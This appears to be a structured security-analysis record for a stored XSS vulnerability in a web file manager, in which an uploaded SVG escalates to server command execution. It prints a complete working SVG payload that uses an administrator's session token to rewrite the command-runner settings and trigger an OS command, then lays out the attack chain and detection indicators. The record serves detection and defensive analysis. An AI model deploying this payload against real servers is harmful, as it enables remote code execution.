package_info.why_malicious: A stored XSS vulnerability allows authenticated users to upload SVG files containing malicious JavaScript, which can be triggered by an administrator to execute arbitrary OS commands on the server, leading to remote code execution (RCE).

malicious_snippets.code_snippet:
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
var xhr = new XMLHttpRequest();
xhr.open("PUT", document.location['origin'] + "/api/settings", true);
xhr.setRequestHeader("Accept", "*/*");
xhr.setRequestHeader("X-Auth", localStorage['jwt']);
xhr.setRequestHeader("Accept-Language", 'en, en;q=0.5');
xhr.setRequestHeader("Content-Type", "text/plain;charset=UTF-8");
xhr.withCredentials = true;
var body = '{"commands":{"before_upload":"touch /tmp/rce.txt","after_copy":[],"after_delete":[],"after_rename":[],"after_save":[]}}';
xhr.send(body);

setTimeout(() => { console.log(); }, 2000);

var xhr2 = new XMLHttpRequest();
xhr2.open("POST", document.location['origin'] + "/api/resources/" + Math.random().toString(36).substring(7) + ".html?override=true", true);
xhr2.setRequestHeader("Accept", "*/*");
xhr2.setRequestHeader("X-Auth", localStorage['jwt']);
xhr2.setRequestHeader("Accept-Language", 'en, en;q=0.5');
xhr2.setRequestHeader("Content-Type", "text/html");
xhr2.withCredentials = true;
xhr2.send("abcd");
</script>
</svg>
malicious_snippets.code_behavior: When an admin previews the uploaded SVG file, the embedded JavaScript sends a PUT request to the /api/settings endpoint to set a 'before_upload' command to 'touch /tmp/rce.txt', then uploads a random file to trigger the command runner, resulting in the creation of /tmp/rce.txt on the server.

malice_analysis.why_suspicious: The SVG file contains embedded JavaScript that manipulates application settings and triggers OS command execution via the application's command runner feature.
malice_analysis.violated_expectations: SVG files are expected to contain only vector graphics data, not executable JavaScript that alters server configuration or triggers OS commands.
malice_analysis.similar_legitimate_use: SVG files may contain JavaScript for interactive graphics, but never to alter server-side settings or execute OS commands.
key_indicators: Direct manipulation of application settings via API
Setting command runner to execute arbitrary shell commands
Triggering file upload to execute the configured command

attack_chain.action: Attacker uploads a malicious SVG file containing JavaScript XSS payload.
attack_chain.leads_to: Payload is stored on the server and awaits execution.

attack_chain.action: Administrator previews or opens the malicious SVG file, triggering the embedded JavaScript.
attack_chain.leads_to: JavaScript executes in the admin's browser context.

attack_chain.action: JavaScript sends a PUT request to set the 'before_upload' command to 'touch /tmp/rce.txt'.
attack_chain.leads_to: Command runner is configured to execute arbitrary OS command.

attack_chain.action: JavaScript uploads a random file to trigger the 'before_upload' event, causing the server to execute the OS command.
attack_chain.leads_to: Arbitrary OS command is executed on the server (RCE achieved).

behavioral_signatures: Unexpected JavaScript execution during file preview
API requests to /api/settings with command runner parameters from browser context
Unusual 'before_upload' or similar command runner settings being set via API
file_indicators: Files named exploit.svg or similar, uploaded by non-admin users
network_indicators: PUT requests to /api/settings with command runner configuration
POST requests to /api/resources/ with random filenames from browser context
detection_knowledge.how_to_detect: Monitor for SVG file uploads containing <script> tags, especially from non-admin users. Alert on API requests that set or modify command runner parameters from browser sessions. Detect and block execution of JavaScript in SVG previews. Implement and enforce Content-Security-Policy headers to prevent inline script execution. Review audit logs for unexpected changes to command runner settings and for file creations in sensitive directories (e.g., /tmp/rce.txt).
